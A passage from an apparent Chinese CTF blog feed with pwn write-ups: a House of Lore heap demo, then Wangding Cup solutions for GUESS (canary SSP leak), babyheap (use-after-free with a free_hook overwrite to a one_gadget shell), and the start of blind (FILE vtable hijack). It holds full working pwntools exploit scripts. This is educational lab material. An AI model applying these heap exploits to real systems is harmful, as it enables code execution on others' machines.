fake_chunk;                  // At address 0x7ffdeb37d050</span><br><span class="line">struct small_chunk another_fake_chunk;</span><br><span class="line">struct small_chunk *real_chunk;</span><br><span class="line">unsigned long long *ptr, *victim;</span><br><span class="line">int len;</span><br><span class="line"></span><br><span class="line">len = sizeof(struct small_chunk);</span><br><span class="line"></span><br><span class="line">// Grab two small chunk and free the first one</span><br><span class="line">// This chunk will go into unsorted bin</span><br><span class="line">ptr = malloc(len);                              // points to address 0x1a44010</span><br><span class="line"></span><br><span class="line">// The second malloc can be of random size. We just want that</span><br><span class="line">// the first chunk does not merge with the top chunk on freeing</span><br><span class="line">malloc(len);                                    // points to address 0x1a440a0</span><br><span class="line"></span><br><span class="line">// This chunk will end up in unsorted bin</span><br><span class="line">free(ptr);</span><br><span class="line"></span><br><span class="line">real_chunk = (struct small_chunk *)(ptr - 2);   // points to address 0x1a44000</span><br><span class="line"></span><br><span class="line">// Grab another chunk with greater size so as to prevent getting back</span><br><span class="line">// the same one. Also, the previous chunk will now go from unsorted to</span><br><span class="line">// small bin</span><br><span class="line">malloc(len + 0x10);                             // points to address 0x1a44130</span><br><span class="line"></span><br><span class="line">// Make the real small chunk&apos;s bk pointer point to &amp;fake_chunk</span><br><span class="line">// This will insert the fake chunk in the smallbin</span><br><span class="line">real_chunk-&gt;bk = &amp;fake_chunk;</span><br><span class="line">// and fake_chunk&apos;s fd point to the small chunk</span><br><span class="line">// This will ensure that &apos;victim-&gt;bk-&gt;fd == victim&apos; for the real chunk</span><br><span class="line">fake_chunk.fd = real_chunk;</span><br><span class="line"></span><br><span class="line">// We also need this &apos;victim-&gt;bk-&gt;fd == victim&apos; test to pass for fake chunk</span><br><span class="line">fake_chunk.bk = &amp;another_fake_chunk;</span><br><span class="line">another_fake_chunk.fd = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line">// Remove the real chunk by a standard call to malloc</span><br><span class="line">malloc(len);                                    // points at address 0x1a44010</span><br><span class="line"></span><br><span class="line">// Next malloc for that size will return the fake chunk</span><br><span class="line">victim = malloc(len);                           // points at address 0x7ffdeb37d060</span><br></pre></td></tr></table></figure><p>注释已经说得很清楚了，就不再赘述了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Lore-原理&quot;&gt;&lt;a href=&quot;#House-of-Lore-原理&quot; class=&quot;headerlink&quot; title=&quot;House of Lore 原理&quot;&gt;&lt;/a&gt;House of Lore 原理&lt;/h1&gt;&lt;p&gt;看了下原理，没有太多的东西，
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯pwn复现</title>
    <link href="http://siriuswhiter.tk/2018/12/28/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
    <id>http://siriuswhiter.tk/2018/12/28/网鼎杯pwn复现/</id>
    <published>2018-12-28T11:20:12.000Z</published>
    <updated>2018-12-30T06:18:30.806Z</updated>
    
    <content type="html"><![CDATA[<p><em>第一次打比赛便被网鼎杯血虐，当时栈溢出的水平不足以达到唯一的一个栈溢出的题目的要求，堆就更不必多说了。</em><br><em>现在在学习堆的中间回来看看有没有能力去复现当时的题。</em></p><h1 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>还是比较清晰的，将flag.txt的内容读到了栈上，我们就是想方设法将其输出出来；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-84h]</span><br><span class="line">  __int64 i; // [rsp+20h] [rbp-80h]</span><br><span class="line">  __int64 max_num_3; // [rsp+28h] [rbp-78h]</span><br><span class="line">  char flag_is_here; // [rsp+30h] [rbp-70h]</span><br><span class="line">  char s2; // [rsp+60h] [rbp-40h]</span><br><span class="line">  unsigned __int64 canary; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(0x28u);</span><br><span class="line">  max_num_3 = 3LL;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = 0;</span><br><span class="line">  i = 0LL;</span><br><span class="line">  setvbuf_and_alarm();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2);</span><br><span class="line">  if ( HIDWORD(stat_loc.__iptr) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;./flag.txt&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;flag_is_here, 0x30uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));             // read flag.txt </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt;= max_num_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = get_fork();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++i;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);</span><br><span class="line">  if ( !strcmp(&amp;flag_is_here, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序有canary，溢出点也很清晰；<br>这里就涉及到了canary的ssp leak；<br>因为只有三次机会，我们需要的就是栈地址；<br>所以第一次得到libc地址，第二次可以用environ变量得到栈地址，第三次读flag即可。</p><p>当时卡住的地方是栈地址的泄露：<br>  栈的地址可以通过libc中的一个变量 _environ变量泄露出来。因为在libc中的全局变量 environ储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，进而计算出flag在栈上的地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./GUESS&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">puts_got = 0x602020</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(puts_got)*0x100)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recvn(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc.address = puts_addr- libc.symbols[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line">environ = libc.symbols[&apos;environ&apos;]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(environ)*0x100)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(sh.recvn(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;guessing flag\n&quot;)</span><br><span class="line">sh.sendline(p64(stack_addr -0x168)*0x100)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"></span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;Th1s_1S_Fl3g&#125;</span><br><span class="line">me terminated</span><br></pre></td></tr></table></figure><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>题目写的还是比较清晰的，功能如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1.alloc&quot;);</span><br><span class="line">  puts(&quot;2.edit&quot;);</span><br><span class="line">  puts(&quot;3.show&quot;);</span><br><span class="line">  puts(&quot;4.free&quot;);</span><br><span class="line">  puts(&quot;5.exit&quot;);</span><br><span class="line">  return printf(&quot;Choice:&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alloc 会分配固定0x30大小的chunk，最多alloc 9次；<br>edit 可以选择修改chunk，最多edit 3次 ， 与alloc均不存在溢出的可能；<br>show 会将内容打印出来；<br>free 将chunk free掉，有明显的UAF漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyheap</span><br><span class="line">[*] &apos;/home/sirius/tikool/wangdingbei/babyheap/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>保护基本上全开，为了拿到shell，我们选择修改malloc_hook或free_hook来执行system(‘/bin/sh’)或使用one_gadget拿shell；</p><p>为了能够修改free_hook,我们需要leak libc的基址，但是程序只会固定malloc(0x20),也就是0x30大小的chunk，该chunk属于fastbin，而众所周知，fastbin是没办法泄露libc基址的，因此我们需要smallbin；</p><p>为了能够搞到smallbin，我们决定利用free的漏洞，当连续free两个chunk时，后free的fastbin的fd指针会指向先free的chunk，然后我们show便可以泄露堆地址；</p><p>当泄露出堆地址之后，我们可以修改fd指针的指向地址，这样malloc时便会到我们想要的地址，所以我们有机会来让修改chunk能够使其去伪造smallbin大小的chunk，这样想方设法将其free之后，其fd指针与bk指针指向&lt;main_arena+88&gt;处，这样show便可以泄露libc地址。</p><p>不过最终要控制malloc 与 edit的次数，在有限的次数内完成功能， 不得已的话再想办法修改edit的次数限制。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def Add(index, data):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def Edit(index, data):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def Show(index):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def Delete(index):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(0,&apos;aaaaaaaa\n&apos;)</span><br><span class="line">Add(1,&apos;bbbbbbbb\n&apos;)</span><br><span class="line">Add(2,&apos;cccccccc\n&apos;)</span><br><span class="line">Add(3,&apos;dddddddd\n&apos;)</span><br><span class="line"></span><br><span class="line">#--------------leak heap addr----------------</span><br><span class="line">Add(4, p64(0xa0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))</span><br><span class="line">Add(5, p64(0x30) + p64(0x30) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line">Delete(0)</span><br><span class="line"></span><br><span class="line">Show(0)</span><br><span class="line">heap_addr = u64(p.recvline()[ : -1].ljust(8, &apos;\x00&apos;)) - 0x30</span><br><span class="line">print &quot;heap_addr: &quot; + hex(heap_addr)</span><br><span class="line"></span><br><span class="line">``</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602060     &lt;---chunk_ptr 0-5</span><br><span class="line">0x602060:0x00000000011e20100x00000000011e2040</span><br><span class="line">0x602070:0x00000000011e20700x00000000011e20a0</span><br><span class="line">0x602080:0x00000000011e20d00x00000000011e2100</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/40gx 0x000000000011e2000</span><br><span class="line">0x11e2000:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2010:0x00000000011e2030 &lt;--- get heap addr0x0000000000000000</span><br><span class="line">0x11e2020:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2030:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2040:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2060:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2070:0x63636363636363630x0000000000000000</span><br><span class="line">0x11e2080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2090:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20a0:0x64646464646464640x0000000000000000</span><br><span class="line">0x11e20b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e20c0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20d0:0x00000000000000a00x0000000000000031</span><br><span class="line">0x11e20e0:0x00000000006020680x0000000000602070</span><br><span class="line">0x11e20f0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2100:0x00000000000000300x0000000000000030</span><br><span class="line">0x11e2110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x11e2130:0x00000000000000000x0000000000000000</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">#-------------leak libc addr--------------------</span><br><span class="line">Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">Add(6, p64(0) + p64(0xa1) + &apos;\n&apos;)</span><br><span class="line">Add(7, p64(0) + p64(0xa1) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line">Show(1)</span><br><span class="line">libc_address = u64(p.recvline()[ : -1].ljust(8, &apos;\x00&apos;))-0x3c4b78</span><br><span class="line">print &quot;libc_addr: &quot; + hex(libc_address)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">``</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602060  &lt;---- chunk_ptr 0-7</span><br><span class="line">0x602060:0x00000000011e20100x00000000011e2040</span><br><span class="line">0x602070:0x00000000011e20700x00000000011e20a0</span><br><span class="line">0x602080:0x00000000006020680x00000000011e2100</span><br><span class="line">0x602090:0x00000000011e20100x00000000011e2030 &lt;---被带偏的chunk</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/40gx 0x000000000011e2000</span><br><span class="line">0x11e2000:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2010:0x00000000000000000x00000000000000a1</span><br><span class="line">0x11e2020:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2030:0x00000000000000000x00000000000000d1 &lt;-----fake small chunk</span><br><span class="line">0x11e2040:0x00007f042e615b780x00007f042e615b78 &lt;-----get libc addr </span><br><span class="line">0x11e2050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2060:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2070:0x63636363636363630x0000000000000000</span><br><span class="line">0x11e2080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2090:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20a0:0x64646464646464640x0000000000000000</span><br><span class="line">0x11e20b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e20c0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20d0:0x00000000000000a00x0000000000000031</span><br><span class="line">0x11e20e0:0x00000000006020680x0000000000602070</span><br><span class="line">0x11e20f0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2100:0x00000000000000d00x0000000000000030</span><br><span class="line">0x11e2110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x11e2130:0x00000000000000000x0000000000000000</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#---------cover free_hook with one_gadget to get shell --------------------------</span><br><span class="line">one_gadget = 0x45216</span><br><span class="line">free_hook = libc_address + 0x3c67a8</span><br><span class="line">print &quot;free_hook: &quot;+ hex(free_hook)</span><br><span class="line"></span><br><span class="line">Edit(4,p64(free_hook) + &apos;\n&apos;)</span><br><span class="line">Edit(1, p64(libc_address + one_gadget)[:-1] + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>题目风格与babyheap基本一致：<br>malloc的chunk大小变为0x68 最后得到的chunk也就是0x70,最多6个chunk；<br>edit函数功能一致，去掉了次数限制，show函数被去掉；<br>free函数仍然存在UAF，且限制3次。<br>同时添加了一个system(‘/bin/sh’)的函数。</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>直接给了system(‘/bin/sh’)的函数，所以目标就是控制程序执行该函数；<br>看了半天没有头绪，能知道利用UAF漏洞将chunk分配到想要的地方，但是因为没有show函数，并没有办法泄露栈地址；<br>去看了下大佬们的思路，发现是将chunk malloc到bss段，而bss段存在着_IO_FILE的结构体及vtable虚表指针，我们通过修改指针指向，之后伪造file结构体及伪造虚表指针，程序在退出时会自动调用从而拿到shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/6gx 0x602020    &lt;---------bss段的file指针</span><br><span class="line">0x602020 &lt;stdout&gt;:0x00007ffff7dd26200x0000000000000000 </span><br><span class="line">0x602030 &lt;stdin&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x602040 &lt;stderr&gt;:0x00007ffff7dd25400x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/28gx 0x00007ffff7dd2620             &lt;----------stdout的结构体</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:0x00000000fbad28870x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:0x00007ffff7dd26a40x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:0x00000000000000000x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:0x00000000000000010xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:0x000000000a0000000x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007ffff7dd17a00x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007ffff7dd06e0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p  *(struct _IO_FILE_plus *) stdout     &lt;--------结构体含义</span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977, </span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 